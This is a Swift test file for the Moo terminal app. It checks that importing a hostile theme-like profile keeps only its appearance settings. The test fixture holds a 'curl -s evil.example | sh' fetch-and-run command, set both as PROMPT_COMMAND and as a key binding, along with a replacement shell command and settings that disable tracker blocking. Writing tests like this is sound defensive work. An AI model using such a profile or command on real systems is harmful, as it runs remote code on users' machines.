import Foundation
import Testing
@testable import Moo

/// A .mooprofile is passed around like a theme. These start from a hostile
/// file as someone would write it by hand, not from a profile Moo exported.
@MainActor
struct ProfileImportReviewTests {
    private static let startupProfile = "11111111-2222-3333-4444-555555555555"

    /// A profile that looks like a theme, but runs a command in place of the
    /// shell, sets a variable, types a command on a key, claims to be another
    /// terminal, and carries settings that would open it at every launch and
    /// switch off the browser's tracker blocking.
    private static let hostileFile = """
        {
          "version": 1,
          "profile": {
            "id": "\(startupProfile)",
            "name": "Solarized Pro",
            "themeName": "SwiftTerm",
            "fontSize": 14,
            "columns": 50000,
            "rows": 0,
            "scrollbackLines": 999999999,
            "shell": {"command": {"_0": "touch /tmp/x", "runInShell": true}},
            "environmentVariables": [
              {"id": "AAAAAAAA-0000-0000-0000-000000000001", "name": "PROMPT_COMMAND", "value": "curl -s evil.example | sh"}
            ],
            "keyBindings": [
              {"id": "AAAAAAAA-0000-0000-0000-000000000002", "key": "l", "modifiers": 1,
               "action": "sendText", "value": "curl -s evil.example | sh\\r"}
            ],
            "termProgram": "iTerm.app\\nSets nothing else",
            "termVersion": "3"
          },
          "settings": {
            "startupMode": "profile",
            "startupProfileID": "\(startupProfile)",
            "startupWindowGroupID": "\(startupProfile)",
            "browserContentBlockingEnabled": false,
            "useMetalRenderer": false
          }
        }
        """

    private func makeStore() throws -> (ProfileStore, URL) {
        let dir = FileManager.default.temporaryDirectory
            .appendingPathComponent("profile-import-review-tests-\(UUID().uuidString)")
        return (try ProfileStore(directory: dir), dir)
    }

    private func write(_ text: String, in dir: URL) throws -> URL {
        let file = dir.appendingPathComponent("hostile.mooprofile")
        try Data(text.utf8).write(to: file)
        return file
    }

    /// The file really carries what it claims: otherwise the tests below
    /// would pass against a profile that never held the attack.
    @Test func hostileFileDecodesWithEveryPayload() throws {
        let (_, dir) = try makeStore()
        defer { try? FileManager.default.removeItem(at: dir) }
        // columns 50000 is fine to decode, rows 0 is not: validation runs
        // before clamping, so use a file that passes it.
        let file = try write(Self.hostileFile.replacingOccurrences(of: "\"rows\": 0", with: "\"rows\": 30"), in: dir)
        let candidate = try ProfileStore.readImport(from: file)
        #expect(candidate.profile.shell == .command("touch /tmp/x", runInShell: true))
        #expect(candidate.profile.environmentVariables.map(\.name) == ["PROMPT_COMMAND"])
        #expect(candidate.profile.keyBindings.first?.action == .sendText)
        #expect(candidate.profile.termProgram.hasPrefix("iTerm.app"))
        #expect(ProfileStore.embeddedSettings(in: candidate.data)?["startupMode"] == .string("profile"))
    }

    /// Invalid values are still refused outright, before any review.
    @Test func zeroRowsIsRefused() throws {
        let (_, dir) = try makeStore()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = try write(Self.hostileFile, in: dir)
        #expect(throws: VersionedPersistenceError.self) { try ProfileStore.readImport(from: file) }
    }

    /// The default choice (Return in the review alert) and the settings
    /// alert's "Apply Settings": nothing that runs is stored, and the startup
    /// and content-blocking settings stay as this Mac has them.
    @Test func defaultImportStoresNoneOfTheHostileParts() throws {
        let (store, dir) = try makeStore()
        defer { try? FileManager.default.removeItem(at: dir) }
        let suite = "profile-import-review-\(UUID().uuidString)"
        let defaults = try #require(UserDefaults(suiteName: suite))
        defer { defaults.removePersistentDomain(forName: suite) }
        defaults.set("default", forKey: "startupMode")
        defaults.set(true, forKey: ContentBlockingDefaults.enabledKey)

        let file = try write(Self.hostileFile.replacingOccurrences(of: "\"rows\": 0", with: "\"rows\": 30"), in: dir)
        let candidate = try ProfileStore.readImport(from: file)
        let items = ProfileImportReview.items(in: candidate.profile)
        #expect(items.count == 5)
        #expect(items.contains { $0.contains("touch /tmp/x") })
        #expect(items.contains { $0.contains("PROMPT_COMMAND=curl -s evil.example | sh") })
        // Shown as data: the newline in the value cannot start a line of its own.
        #expect(items.allSatisfy { !$0.contains("\n") })

        let imported = try store.importProfile(candidate, scope: .appearanceOnly)
        let stored = try #require(store.profile(withID: imported.id))
        #expect(stored.shell == .loginShell)
        #expect(stored.environmentVariables.isEmpty)
        #expect(stored.keyBindings.isEmpty)
        #expect(stored.termProgram == TerminalProfile.standardValues.termProgram)
        #expect(stored.termVersion == TerminalProfile.standardValues.termVersion)
        #expect(ProfileImportReview.items(in: stored).isEmpty)
        // The appearance is kept.
        #expect(stored.fontSize == 14)
        #expect(stored.name == "Solarized Pro")

        AppSettings.apply(try #require(ProfileStore.embeddedSettings(in: candidate.data)), to: defaults)
        let domain = defaults.persistentDomain(forName: suite) ?? [:]
        #expect(domain["startupMode"] as? String == "default")
        #expect(domain[AppSettings.startupProfileID] == nil)
        #expect(domain["startupWindowGroupID"] == nil)
        #expect(domain[ContentBlockingDefaults.enabledKey] as? Bool == true)
        // An ordinary setting in the same file still applies.
        #expect(domain["useMetalRenderer"] as? Bool == false)
    }

    /// The one-step import used by everything but the alert also defaults to
    /// appearance only.
    @Test func oneStepImportDefaultsToAppearanceOnly() throws {
        let (store, dir) = try makeStore()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = try write(Self.hostileFile.replacingOccurrences(of: "\"rows\": 0", with: "\"rows\": 30"), in: dir)
        let imported = try store.importProfile(from: file)
        #expect(imported.shell == .loginShell)
        #expect(imported.keyBindings.isEmpty)
        #expect(imported.environmentVariables.isEmpty)
    }

    /// "Import Everything" is a deliberate choice, and keeps it all.
    @Test func importEverythingKeepsTheProfileAsWritten() throws {
        let (store, dir) = try makeStore()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = try write(Self.hostileFile.replacingOccurrences(of: "\"rows\": 0", with: "\"rows\": 30"), in: dir)
        let imported = try store.importProfile(ProfileStore.readImport(from: file), scope: .everything)
        #expect(imported.shell == .command("touch /tmp/x", runInShell: true))
        #expect(imported.keyBindings.count == 1)
    }

    /// Sizes from the file are brought into ranges Moo can draw.
    @Test func importedNumbersAreClamped() throws {
        let (_, dir) = try makeStore()
        defer { try? FileManager.default.removeItem(at: dir) }
        let text = Self.hostileFile
            .replacingOccurrences(of: "\"rows\": 0", with: "\"rows\": 30")
            .replacingOccurrences(of: "\"fontSize\": 14", with: "\"fontSize\": 100000")
        let candidate = try ProfileStore.readImport(from: try write(text, in: dir))
        #expect(candidate.profile.columns == 1_000)
        #expect(candidate.profile.rows == 30)
        #expect(candidate.profile.scrollbackLines == 1_000_000)
        #expect(candidate.profile.fontSize == 288)
        var tiny = TerminalProfile(name: "Tiny")
        tiny.fontSize = 0.5
        tiny.scrollbackLines = nil
        #expect(ProfileImportReview.clamped(tiny).fontSize == 4)
        #expect(ProfileImportReview.clamped(tiny).scrollbackLines == nil)
    }

    /// A profile that only changes how Moo looks has nothing to review.
    @Test func plainProfileNeedsNoReview() {
        var profile = TerminalProfile(name: "Theme only")
        profile.fontSize = 16
        profile.themeName = "Homebrew"
        #expect(ProfileImportReview.items(in: profile).isEmpty)
    }

    @Test func longReviewListsAreCapped() {
        var profile = TerminalProfile(name: "Many")
        profile.environmentVariables = (0..<40).map { TerminalEnvironmentVariable(name: "V\($0)", value: "x") }
        let items = ProfileImportReview.items(in: profile)
        let summary = ProfileImportReview.summary(of: items)
        #expect(summary.components(separatedBy: "\n").count == ProfileImportReview.shownItemLimit + 1)
        #expect(summary.hasSuffix("…and 28 more"))
    }
}
